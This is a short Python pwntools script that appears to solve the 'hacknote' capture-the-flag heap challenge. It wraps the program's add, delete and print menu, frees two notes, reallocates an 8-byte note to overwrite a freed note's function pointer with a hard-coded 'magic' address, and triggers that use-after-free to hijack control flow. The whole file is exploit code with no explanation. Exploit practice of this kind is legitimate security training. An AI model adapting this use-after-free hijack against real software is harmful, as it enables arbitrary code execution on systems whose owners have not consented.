from pwn import *

context(arch='i386', os='linux', log_level='debug')

r = process('./hacknote')

def addnode(size, content):
    r.recvuntil(b'Your choice :')
    r.sendline(b'1')
    r.recvuntil(b'Note size :')
    r.sendline(size)
    r.recvuntil(b'Content :')
    r.sendline(content)

def delnode(index):
    r.recvuntil(b'Your choice :')
    r.sendline(b'2')
    r.recvuntil(b'Index :')
    r.sendline(index)

def printnode(index):
    r.recvuntil(b'Your choice :')
    r.sendline(b'3')
    r.recvuntil(b'Index :')
    r.sendline(index)


magic_addr = 0x08048986
addnode(b'24', b'chunk1')
addnode(b'24', b'chunk2')
delnode(b'0')
delnode(b'1')
addnode(b'8', p32(magic_addr))
gdb.attach(r)
printnode(b'0')

r.interactive()